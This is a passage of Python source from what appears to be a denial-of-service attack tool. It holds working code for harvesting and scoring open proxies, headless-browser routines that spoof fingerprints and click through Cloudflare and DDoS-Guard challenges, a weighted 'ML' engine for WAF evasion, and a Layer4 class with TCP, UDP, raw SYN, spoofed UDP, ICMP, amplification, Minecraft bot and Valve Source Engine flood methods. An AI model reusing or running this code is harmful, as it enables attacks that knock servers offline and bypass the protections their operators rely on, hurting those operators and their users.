                    f"{bcolors.OKGREEN}[*] Tactical Pool: {len(new_proxies):,} nodes active. Elite-Tier Latency: {avg_lat:.1f}ms{bcolors.RESET}"
                )

    def get_proxy(self) -> Optional[Proxy]:
        # Lock-free read path for maximum performance under heavy thread load
        if time() - self._last_weight_update > 60:
            self._update_weights()
            
        pool = getattr(self, '_pool_copy', [])
        weights = getattr(self, '_weights', [])
        
        if not pool: return None
        try:
            return random.choices(pool, weights=weights, k=1)[0].base
        except:
            return pool[0].base

    def __len__(self):
        with self._lock: return len(self._proxies)

    def get_tactical_size(self):
        return len(self)


class AutonomousHarvester:
    FALLBACK_APIS = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt"
    ]

    @staticmethod
    def fromString(line: str) -> Optional[Proxy]:
        line = line.strip()
        if not line: return None
        
        # Robust parsing for Type://IP:PORT and IP:PORT formats
        try:
            if "://" in line:
                return Proxy.fromString(line)
            
            # Default to SOCKS5 for raw IP:PORT if format unknown
            import re
            match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)", line)
            if match:
                ip, port = match.group(1), int(match.group(2))
                return Proxy(ip, port, ProxyType.SOCKS5)
        except: pass
        return None

    @staticmethod
    def emergency_harvest(proxy_ty: int) -> Set[Proxy]:
        logger.warning(f"{bcolors.FAIL}[!] EMERGENCY PROTOCOL: Autonomous Sourcing Activated. Initiating deep global scrape...{bcolors.RESET}")
        proxies = set()
        
        def _fetch(url):
            try:
                res = get(url, timeout=10)
                if res.status_code == 200:
                    for line in res.text.splitlines():
                        p = AutonomousHarvester.fromString(line)
                        if p: proxies.add(p)
            except: pass

        with ThreadPoolExecutor(max_workers=len(AutonomousHarvester.FALLBACK_APIS)) as executor:
            executor.map(_fetch, AutonomousHarvester.FALLBACK_APIS)
            
        logger.info(f"{bcolors.WARNING}[*] EMERGENCY PROTOCOL: Successfully recovered {len(proxies):,} raw assets from global fallback matrices.{bcolors.RESET}")
        return proxies


class ReloadSentinel(Thread):
    def __init__(
        self, interval_mins: int, con, proxy_arg, proxy_ty, pool: TacticalProxyPool, url=None
    ):
        Thread.__init__(self, daemon=True)
        self.interval = interval_mins * 60
        self.con = con
        self.proxy_arg = proxy_arg
        self.proxy_ty = proxy_ty
        self.pool = pool
        self.url = url

    def run(self):
        if self.interval <= 0:
            return

        while True:
            # Add jitter to prevent simultaneous database writes across multiple tasks
            sleep(self.interval + random.uniform(0, 30))
            
            # Check if pool is critically low
            if self.pool.get_tactical_size() < 10:
                logger.warning(f"{bcolors.FAIL}[!] Sentinel Alert: Tactical Pool Depleted ({self.pool.get_tactical_size()} active). Executing Emergency Sourcing.{bcolors.RESET}")
                raw_emergency = AutonomousHarvester.emergency_harvest(self.proxy_ty)
                if raw_emergency:
                    scored_emergency = asyncio.run(TacticalProxyValidator.validate_and_score(raw_emergency, str(self.url) if self.url else None))
                    self.pool.update_pool(scored_emergency)
                    continue

            logger.info(
                f"{bcolors.OKCYAN}[*] Sentinel: Periodic proxy refresh initiated...{bcolors.RESET}"
            )
            try:
                new_proxies = handleProxyList(
                    self.con, self.proxy_arg, self.proxy_ty, self.url
                )
                if new_proxies:
                    # In handleProxyList we return normal Proxies if from file/url directly.
                    # We need to ensure they are scored here if they aren't already.
                    if isinstance(new_proxies, list) and len(new_proxies) > 0 and isinstance(new_proxies[0], TacticalProxy):
                        self.pool.update_pool(new_proxies)
                    else:
                        scored = asyncio.run(TacticalProxyValidator.validate_and_score(set(new_proxies), str(self.url) if self.url else None))
                        self.pool.update_pool(scored)
            except Exception as e:
                logger.error(
                    f"{bcolors.FAIL}[!] Sentinel Error during refresh: {e}{bcolors.RESET}"
                )


class Tools:
    IP = re.compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = re.compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B",
            "k{}B",
            "M{}B",
            "G{}B",
            "T{}B",
            "P{}B",
            "E{}B",
            "Z{}B",
            "Y{}B",
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> Union[str, int]:
        suffixes = ["", "k", "m", "g", "t", "p"]
        if num > 999:
            obje = sum([abs(num / 1000.0**x) >= 1 for x in range(1, len(suffixes))])
            return f"{num / 1000.0**obje:.{precision}f}{suffixes[obje]}"
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len(
            "\r\n".join(f"{key}: {value}" for key, value in res.request.headers.items())
        )
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1",
            }
            with s.get(url, headers=hdrs, timeout=10) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.post(
                "https://check.ddos-guard.net/check.js", headers=hdrs, timeout=10
            ) as ss:
                for key, value in ss.cookies.items():
                    if key == "__ddg2":
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.get(
                f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs, timeout=10
            ) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s
        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class MLSmartBypassEngine:
    """Adaptive Heuristic Feedback Loop for WAF Evasion (ML-inspired)"""
    def __init__(self):
        self.lock = Lock()
        self.fingerprints = [
            {
                "id": "chrome_win_133",
                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                "headers": (
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
                    "Accept-Encoding: gzip, deflate, br, zstd\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Sec-Ch-Ua: \"Chromium\";v=\"133\", \"Google Chrome\";v=\"133\", \"Not-A.Brand\";v=\"99\"\r\n"
                    "Sec-Ch-Ua-Mobile: ?0\r\n"
                    "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                    "Sec-Fetch-User: ?1\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                ),
                "weight": 10.0,
                "delay": 0.0
            },
            {
                "id": "firefox_mac_135",
                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
                "headers": (
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                    "Sec-Fetch-User: ?1\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                ),
                "weight": 10.0,
                "delay": 0.1
            },
            {
                "id": "safari_ios_18",
                "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
                "headers": (
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                ),
                "weight": 10.0,
                "delay": 0.05
            }
        ]
        self.current_best = self.fingerprints[0]
        self.total_requests = 0
        self.total_blocks = 0

    def get_fingerprint(self):
        with self.lock:
            # Roulette wheel selection based on weight
            total_weight = sum(f["weight"] for f in self.fingerprints)
            if total_weight <= 0:
                for f in self.fingerprints: f["weight"] = 10.0
                total_weight = sum(f["weight"] for f in self.fingerprints)
            
            pick = random.uniform(0, total_weight)
            current = 0
            for f in self.fingerprints:
                current += f["weight"]
                if current > pick:
                    if self.current_best["id"] != f["id"]:
                        logger.debug(f"[*] ML_ENGINE: Switching active fingerprint to {f['id']} (Weight: {f['weight']:.1f})")
                        self.current_best = f
                    return f
            return self.fingerprints[0]

    def report_result(self, fp_id: str, success: bool):
        with self.lock:
            for f in self.fingerprints:
                if f["id"] == fp_id:
                    if success:
                        f["weight"] = min(50.0, f["weight"] * 1.05) # Reward
                        logger.debug(f"[*] ML_ENGINE: Pattern {fp_id} SUCCESS. Weight increased to {f['weight']:.1f}")
                    else:
                        f["weight"] = max(1.0, f["weight"] * 0.8) # Penalize
                        logger.debug(f"[!] ML_ENGINE: Pattern {fp_id} FAILED/BLOCKED. Weight decreased to {f['weight']:.1f}")
                    break

ML_ENGINE = MLSmartBypassEngine()


class BrowserEngine:
    """Advanced Browser Fingerprinting Engine for bypassing JS/Captcha challenges"""
    
    @staticmethod
    def solve_cf(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000):
        if not url.startswith("https://") and not url.startswith("http://"):
            url = "https://" + url
        elif url.startswith("http://"):
            url = url.replace("http://", "https://")
            
        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Initializing stealth browser for {url}...{bcolors.RESET}")
        
        if NODRIVER_INSTALLED:
            logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Nodriver engine activated.{bcolors.RESET}")
            try:
                import nodriver as uc
                
                async def run_nodriver():
                    browser_args = [
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-setuid-sandbox",
                        "--window-position=-32000,-32000" if sys.platform.lower().startswith("win") else ""
                    ]
                    if proxy:
                        proxy_url = f"http://{proxy}" if not "://" in proxy else proxy
                        browser_args.append(f"--proxy-server={proxy_url}")
                        
                    browser = await uc.start(browser_args=[arg for arg in browser_args if arg])
                    page = await browser.get(url)
                    
                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for auto-validation (Max 45s)...{bcolors.RESET}")
                    
                    # Dedicated loop to wait for clearance and valid page title
                    start_wait = time()
                    title = ""
                    cookie_str = ""
                    success = False
                    
                    while time() - start_wait < 45:
                        try:
                            title = await page.evaluate('document.title')
                            title_clean = str(title).encode('ascii', 'ignore').decode('ascii') # Prevent UnicodeEncodeError on Windows
                            
                            cookies = await browser.cookies.get_all()
                            cookie_str = "; ".join([f"{c.name}={c.value}" for c in cookies])
                            
                            is_challenge = any(k in str(title).lower() for k in [
                                "just a moment", "checking your browser", "enable javascript", 
                                "access denied", "attention required", "ddos-guard", "cloudflare"
                            ])
                            
                            if not is_challenge and "cf_clearance" in cookie_str and len(str(title)) > 0:
                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Barrier Breached (Fidelity: HIGH). Page Title: {title_clean}{bcolors.RESET}")
                                success = True
                                break
                        except Exception:
                            pass
                        await asyncio.sleep(2)
                    
                    if not success:
                        title_clean = str(title).encode('ascii', 'ignore').decode('ascii') if title else "Unknown"
                        if "cf_clearance" not in cookie_str:
                            logger.warning(f"{bcolors.WARNING}[!] Headless Recon: Failed to obtain cf_clearance. Final Title: {title_clean}{bcolors.RESET}")
                        else:
                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Clearance Obtained but title still flagged. Proceeding with caution.{bcolors.RESET}")
                    
                    try:
                        ua = await page.evaluate('navigator.userAgent')
                    except:
                        ua = None
                        
                    try:
                        # Nodriver stop() may return None or throw exceptions in Windows asyncio
                        res = browser.stop()
                        if asyncio.iscoroutine(res):
                            await res
                    except Exception as e:
                        logger.debug(f"[*] Nodriver cleanup info: {e}")
                        
                    return cookie_str if "cf_clearance" in cookie_str else None, ua

                # Since solve_cf is run in a Thread via asyncio.to_thread, we need a new loop
                new_loop = asyncio.new_event_loop()
                asyncio.set_event_loop(new_loop)
                cookie_str, ua = new_loop.run_until_complete(run_nodriver())
                new_loop.close()
                return cookie_str, ua
                
            except Exception as e:
                logger.error(f"{bcolors.FAIL}[!] Nodriver Recon Failed: {e}. Falling back to Playwright...{bcolors.RESET}")
        
        if not PLAYWRIGHT_INSTALLED:
            logger.error("[!] Playwright is not installed. CFBUAM requires playwright or nodriver.")
            return None, None
            
        if not user_agent:
            user_agent = ML_ENGINE.get_fingerprint()["ua"]

        is_windows = sys.platform.lower().startswith('win')
        try:
            with sync_playwright() as p:
                launch_args = {
                    "headless": not is_windows, # Turnstile frequently requires a real rendering context
                    "args": [
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-setuid-sandbox",
                        "--ignore-certificate-errors",
                        "--disable-web-security",
                        "--allow-running-insecure-content",
                        "--disable-infobars",
                        "--window-position=-32000,-32000",
                        "--ignore-certifcate-errors",
                        "--ignore-certifcate-errors-spki-list",
                    ],
                    "ignore_default_args": ["--enable-automation"]
                }
                
                if proxy:
                    proxy_url = f"http://{proxy}" if not "://" in proxy else proxy
                    launch_args["proxy"] = {"server": proxy_url}
                    
                browser = p.chromium.launch(**launch_args)
                context = browser.new_context(
                    viewport={'width': 1920 + randint(-10, 10), 'height': 1080 + randint(-10, 10)},
                    user_agent=user_agent,
                    device_scale_factor=1,
                    has_touch=True,
                )
                
                page = context.new_page()
                if STEALTH_INSTALLED:
                    try:
                        Stealth().apply_stealth_sync(page)
                    except: pass
                
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    window.chrome = { runtime: {} };
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                    Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
                    Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
                    
                    const getParameter = WebGLRenderingContext.prototype.getParameter;
                    WebGLRenderingContext.prototype.getParameter = function(parameter) {
                        if (parameter === 37445) return 'Intel Inc.';
                        if (parameter === 37446) return 'Intel(R) Iris(TM) Plus Graphics 640';
                        return getParameter.apply(this, arguments);
                    };
                """)
                
                logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Navigating and solving challenges...{bcolors.RESET}")
                
                try:
                    page.goto(url, wait_until="domcontentloaded", timeout=15000)
                except Exception:
                    pass
                
                try:
                    sleep(2)
                    # Human-like scrolling jitter
                    page.mouse.wheel(0, randint(200, 500))
                    sleep(0.5)
                    page.mouse.wheel(0, -randint(200, 500))
                    
                    solved = False
                    for attempt in range(15):
                        page.wait_for_timeout(1000)
                        
                        # Check frame URLs (Most reliable for Cloudflare Turnstile)
                        for frame in page.frames:
                            try:
                                f_url = frame.url.lower()
                                if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
                                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget found in frame. Interaction pulse {attempt+1}...{bcolors.RESET}")
                                    box = frame.frame_element().bounding_box()
                                    if box:
                                        target_x = box['x'] + (box['width'] * 0.15)
                                        target_y = box['y'] + (box['height'] * 0.5)
                                        page.mouse.move(target_x, target_y, steps=10)
                                        sleep(0.5)
                                        page.mouse.click(target_x, target_y)
                                        logger.debug(f"[*] Headless Recon: Pulse click at {target_x}, {target_y}")
                                        solved = True
                                        break
                            except: continue
                            
                        # Fallback: CSS Selectors without timeout blocking
                        if not solved:
                            selectors = ["input[type='checkbox']", "#challenge-stage", "div.ctp-checkbox-container", ".check", "[role='checkbox']", "#cf-stage"]
                            for selector in selectors:
                                try:
                                    if page.locator(selector).count() > 0 and page.locator(selector).is_visible():
                                        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Challenge widget detected on main page. Pulse {attempt+1}...{bcolors.RESET}")
                                        page.locator(selector).click(timeout=2000, delay=100)
                                        solved = True
                                        break
                                except: pass
                                
                        if solved: 
                            page.wait_for_timeout(3000)
                            try:
                                if "just a moment" not in page.title().lower():
                                    break
                            except Exception as e:
                                if "Execution context was destroyed" in str(e):
                                    logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected. Challenge likely bypassed.{bcolors.RESET}")
                                    break
                            solved = False
                        
                        # Background JS Challenges require simple mouse movement without clicks
                        page.mouse.move(randint(100, 900), randint(100, 900), steps=5)
                        sleep(1.0)
                except Exception as e:
                    if "Execution context was destroyed" in str(e):
                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Navigation detected during interaction.{bcolors.RESET}")
                    else:
                        pass

                logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for bypass validation...{bcolors.RESET}")
                for i in range(40):
                    cookies_list = context.cookies()
                    if any(c['name'] == 'cf_clearance' for c in cookies_list):
                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cloudflare Clearance Obtained!{bcolors.RESET}")
                        break
                    
                    try: 
                        title = page.title().lower()
                        content = page.content().lower()
                        is_challenge = any(k in title or k in content for k in ["just a moment", "checking your browser", "enable javascript", "access denied", "attention required"])
                        if not is_challenge and title != "" and len(content) > 2000:
                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Barrier Breached (Fidelity: HIGH).{bcolors.RESET}")
                            break
                    except Exception as e:
                        if "Execution context was destroyed" in str(e):
                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Context destroyed (Navigated). Extracting cookies...{bcolors.RESET}")
                            break
                    sleep(1.5)
                
                final_title = ""
                try: 
                    final_title = page.title()
                    final_title = str(final_title).encode('ascii', 'ignore').decode('ascii')
                except: pass
                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished. Page Title: {final_title}{bcolors.RESET}")
                
                cookies_list = context.cookies()
                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
                ua = page.evaluate("navigator.userAgent")
                
                browser.close()
                return cookie_str, ua
                
        except Exception as e:
            logger.error(f"{bcolors.FAIL}[!] Headless Recon Failed: {e}{bcolors.RESET}")
            return None, None

class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b""
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b"".join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack(">H", integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack(">q", integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(target[0].encode()),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def handshake_forwarded(
        target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID
    ) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(
                target[0].encode(), b"\x00", ip.encode(), b"\x00", uuid.hex.encode()
            ),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(
            Minecraft.varint(
                0x00 if protocol >= 391 else 0x01 if protocol >= 385 else 0x00
            ),
            Minecraft.data(username),
        )

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x0F
                if protocol >= 755
                else (
                    0x10
                    if protocol >= 712
                    else (
                        0x0F
                        if protocol >= 471
                        else (
                            0x10
                            if protocol >= 464
                            else (
                                0x0E
                                if protocol >= 389
                                else (
                                    0x0C
                                    if protocol >= 386
                                    else (
                                        0x0B
                                        if protocol >= 345
                                        else (
                                            0x0A
                                            if protocol >= 343
                                            else (
                                                0x0B
                                                if protocol >= 336
                                                else (
                                                    0x0C
                                                    if protocol >= 318
                                                    else (
                                                        0x0B
                                                        if protocol >= 107
                                                        else 0x00
                                                    )
                                                )
                                            )
                                        )
                                    )
                                )
                            )
                        )
                    )
                )
            ),
            Minecraft.long(num_id) if protocol >= 339 else Minecraft.varint(num_id),
        )

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x03
                if protocol >= 755
                else (
                    0x03
                    if protocol >= 464
                    else (
                        0x02
                        if protocol >= 389
                        else (
                            0x01
                            if protocol >= 343
                            else (
                                0x02
                                if protocol >= 336
                                else (
                                    0x03
                                    if protocol >= 318
                                    else 0x02 if protocol >= 107 else 0x01
                                )
                            )
                        )
                    )
                )
            ),
            Minecraft.data(message.encode()),
        )


class Layer4:
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxy_pool: TacticalProxyPool = None

    def __init__(
        self,
        target: Tuple[str, int],
        ref: List[str] = None,
        method: str = "TCP",
        synevent: asyncio.Event = None,
        proxy_pool: TacticalProxyPool = None,
        protocolid: int = 74,
    ):
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        self._proxy_pool = proxy_pool
        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP,
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    async def run(self) -> None:
        if self._synevent:
            while not self._synevent.is_set():
                await asyncio.sleep(0.1)
        
        self.select(self._method)
        while self._synevent.is_set():
            await self.SENT_FLOOD()
            await asyncio.sleep(0) # Yield control to event loop to prevent stalls

    def open_connection(
        self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP
    ):
        proxy = None
        if self._proxy_pool:
            proxy = self._proxy_pool.get_proxy()
            if proxy:
                try:
                    s = proxy.open_socket(conn_type, sock_type, proto_type)
                    s.settimeout(0.9)
                    s.connect(self._target)
                    return s
                except Exception:
                    self._proxy_pool.report_failure(proxy)
                    if 's' in locals() and s:
                        with suppress(Exception): s.close()
                    raise
            else:
                s = socket(conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(0.9)
        s.connect(self._target)
        return s

    async def TCP(self) -> None:
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    while self._synevent.is_set() and Tools.send(s, randbytes(1024)):
                        continue
            except: pass
        await asyncio.to_thread(_flood)

    async def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b"\x00")
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    while self._synevent.is_set() and Tools.send(s, handshake):
                        Tools.send(s, ping)
            except: pass
        await asyncio.to_thread(_flood)

    async def CPS(self) -> None:
        global REQUESTS_SENT
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                s.close()
                global REQUESTS_SENT
                REQUESTS_SENT += 1
            except: pass
        await asyncio.to_thread(_flood)

    async def alive_connection(self) -> None:
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    while self._synevent.is_set():
                        s.recv(1)
            except: pass
        await asyncio.to_thread(_flood)

    async def CONNECTION(self) -> None:
        global REQUESTS_SENT
        asyncio.create_task(self.alive_connection())
        REQUESTS_SENT += 1

    async def UDP(self) -> None:
        """Optimized UDP flood using asyncio-friendly socket handling."""
        def _flood():
            with socket(AF_INET, SOCK_DGRAM) as s:
                data = randbytes(1024)
                target = self._target
                while self._synevent.is_set():
                    try:
                        s.sendto(data, target)
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += 1024
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def OVHUDP(self) -> None:
        def _flood():
            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while self._synevent.is_set():
                    for payload in self._generate_ovhudp():
                        try:
                            s.sendto(payload, self._target)
                            global BYTES_SEND, REQUESTS_SENT
                            BYTES_SEND += len(payload)
                            REQUESTS_SENT += 1
                        except Exception:
                            continue
        await asyncio.to_thread(_flood)

    async def ICMP(self) -> None:
        def _flood():
            payload = self._genrate_icmp()
            with socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while self._synevent.is_set():
                    try:
                        s.sendto(payload, self._target)
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += len(payload)
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def SYN(self) -> None:
        """High-efficiency SYN flood with pre-calculated templates."""
        def _flood():
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                target_addr = self._target[0]
                while self._synevent.is_set():
                    packet = self._genrate_syn()
                    try:
                        s.sendto(packet, (target_addr, 0))
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += len(packet)
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def AMP(self) -> None:
        """High-efficiency Amplification flood."""
        def _flood():
            # Pre-fetch payload generator to avoid cycle overhead
            payload_gen = self._amp_payloads
            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while self._synevent.is_set():
                    packet, addr = next(payload_gen)
                    try:
                        s.sendto(packet, addr)
                        global BYTES_SEND, REQUESTS_SENT
                        BYTES_SEND += len(packet)
                        REQUESTS_SENT += 1
                    except Exception:
                        continue
        await asyncio.to_thread(_flood)

    async def MCBOT(self) -> None:
        """Advanced Minecraft Bot flood."""
        def _flood():
            try:
                s = self.open_connection(AF_INET, SOCK_STREAM)
                with s:
                    Tools.send(s, Minecraft.handshake_forwarded(self._target, self.protocolid, 2, ProxyTools.Random.rand_ipv4(), uuid4()))
                    username = f"MCBOT_{ProxyTools.Random.rand_str(5)}"
                    password = b64encode(username.encode()).decode()[:8].title()
                    Tools.send(s, Minecraft.login(self.protocolid, username))
                    sleep(1.5)
                    Tools.send(s, Minecraft.chat(self.protocolid, f"/register {password} {password}"))
                    Tools.send(s, Minecraft.chat(self.protocolid, f"/login {password}"))
                    while self._synevent.is_set():
                        if not Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(128)))): break
                        sleep(1.1)
            except Exception: pass
        await asyncio.to_thread(_flood)

    async def VSE(self) -> None:
        """Valve Source Engine flood."""
        payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
        def _flood():
            with socket(AF_INET, SOCK_DGRAM) as s:
                while self._synevent.is_set():
                    try:
                        s.sendto(payload, self._target)
                        global BYTES_SEND, REQUESTS_SENT
